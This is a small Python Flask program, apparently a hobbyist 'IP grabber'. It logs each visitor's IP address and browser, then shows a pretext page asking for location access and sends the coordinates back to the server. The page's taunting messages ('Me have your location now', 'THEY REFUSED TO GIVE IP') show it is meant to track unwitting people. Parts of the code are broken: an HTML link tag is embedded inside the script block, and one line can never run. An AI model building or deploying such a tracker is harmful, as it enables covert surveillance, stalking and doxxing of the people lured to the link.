from flask import Flask, request, jsonify

app = Flask(__name__)

@app.route('/track', methods=['GET'])
def track():
    user_ip = request.remote_addr
    user_agent = request.headers.get('User-Agent')
    print(f"IP Address: {user_ip}")
    print(f"User Agent: {user_agent}")

    html_page = """
    <!DOCTYPE html>
    <html>
    <head>
        <title>Location Request</title>
    </head>
    <body>
        <h1>Allow Location Access</h1>
        <p>To continue, please giv location access.</p>
        <script>
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(function(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;

                    fetch('/log-location', {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ latitude: lat, longitude: lon })
                    })
                    .then(response => response.text())
                    .then(data => {
                        document.body.innerHTML = "<h2>Thanks Me have your location now :).</h2>";
                    })
                    .catch(err => {
                        document.body.innerHTML = "<h2>Couldn't snatch IP :(.</h2>";
                    });
                }, function(error) {
                    alert("THEY REFUSED TO GIVE IP >;( ");
                });
            } else {
                alert("Buddy, your browser doesn't support Geolocation, Just use Chrome, if that doesn't work your operating system is too old and probably so is your device.");
                <a href="https://www.google.com/intl/en_ca/chrome/next-steps.html?statcb=1&installdataindex=empty&defaultbrowser=0">Download Chrome Here</a>
            }
        </script>
    </body>
    </html>
    """
    return html_page

@app.route('/log-location', methods=['POST'])
def log_location():
    data = request.get_json()
    latitude = data.get('latitude')
    longitude = data.get('longitude')
    print(f"Latitude: {latitude}, Longitude: {longitude}")
    return "Location logged!"
    print("Made By nullsleeps")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)

print("Made By nullsleeps")
